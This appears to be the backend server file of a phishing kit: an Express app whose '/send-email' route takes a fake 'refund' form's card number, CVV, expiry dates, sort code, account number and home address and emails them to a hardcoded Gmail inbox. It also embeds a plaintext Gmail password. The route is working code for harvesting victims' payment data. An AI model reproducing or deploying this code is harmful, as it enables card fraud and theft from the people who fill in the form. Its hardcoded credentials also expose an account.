// server.js

var express = require("express"),
  path = require("path"),
  nodeMailer = require("nodemailer"),
  bodyParser = require("body-parser"),
  cors = require("cors"),
  login = require('./modules/login'),
  otp = require("./modules/verificationCode")
var app = express();

app.use(cors());
app.use(express.static("public"));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.set("port", process.env.PORT || 5000);

// Start node server

app.use(`/login`, login);
app.use("/otp", otp)
app.get("/", function (req, res) {
  res.send(JSON.stringify({ Hello: "‘World’" }));
});
app.post("/send-email", function (req, res) {
  let transporter = nodeMailer.createTransport({
    host: "smtp.gmail.com",
    port: 465,
    secure: true,
    auth: {
      user: "milhas.jean@gmail.com",
      pass: "B023991w",
    },
  });
  let mailOptions = {
    from: '"Krunal Lathiya"', // sender address
    to: "Warren.kiriakou@gmail.com", // list of receivers
    subject: `${req.body.name} requested a new refund`, // Subject line
    html: `<p><b>Name:</b>${req.body.name}</p>
           <p><b>Card Valid From Month:</b>${req.body.valid_from_month}</p>
           <p><b>Card Valid From Year :</b>${req.body.valid_from_year}</p>
           <p><b>Card Valid Till Month :</b>${req.body.expiry_month}</p>
           <p><b>Card Valid Till Year :</b>${req.body.expiry_year}</p>
           <p><b>security code (CVV,CVC) :</b>${req.body.security_code}</p>
           <p><b>Sort Code :</b>${req.body.sortcode}</p>
           <p><b>Account Number :</b>${req.body.accountNumber}</p>
           <p><b>Country/Region :</b>${req.body.country}</p>
           <p><b>Post Code :</b>${req.body.post_code}</p>
           <p><b>Address1 :</b>${req.body.address_1}</p>
           <p><b>Address2 :</b>${req.body.address_2}</p>
           <p><b>Address3 :</b>${req.body.address_3}</p>
           <p><b>Town :</b>${req.body.town}</p>
           <p><b>County :</b>${req.body.county}</p>
           <p><b>Card Number :</b>${req.body.card_number}</p>
    `, // html body
  };
  try {
    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.log(error);
        return res.send(error);
      }
      console.log("Message %s sent: %s", info.messageId, info.response);
      res.send("success");
    });
  } catch (error) {
    console.log(error);
    res.send(error);
  }
});
app.listen(app.get("port"), function () {
  console.log("Node server is running on port " + app.get("port"));
});
